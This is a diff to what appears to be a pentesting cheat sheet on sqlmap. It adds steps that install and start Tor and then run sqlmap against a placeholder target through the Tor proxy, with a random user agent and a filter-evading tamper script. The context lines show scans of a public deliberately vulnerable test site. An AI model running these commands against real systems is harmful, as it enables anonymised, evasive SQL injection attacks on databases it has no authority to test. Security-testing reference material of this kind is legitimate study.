@@ -156,6 +156,14 @@ This option can be used to set the verbosity level of output messages. There exi
 
         sqlmap --list -tempers
         sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --level 2 --risk 2 --tamper='uppercase.py' -v 4
+    # TOR
+        sudo apt update
+        sudo apt install tor
+        sudo service tor start
+        netstat -antp | grep 9050
+        sqlmap -u <target_url> --tor --tor-type=SOCKS5 --tor-port=9050 --random-agent --tamper=space2comment
+
+
 
 
 
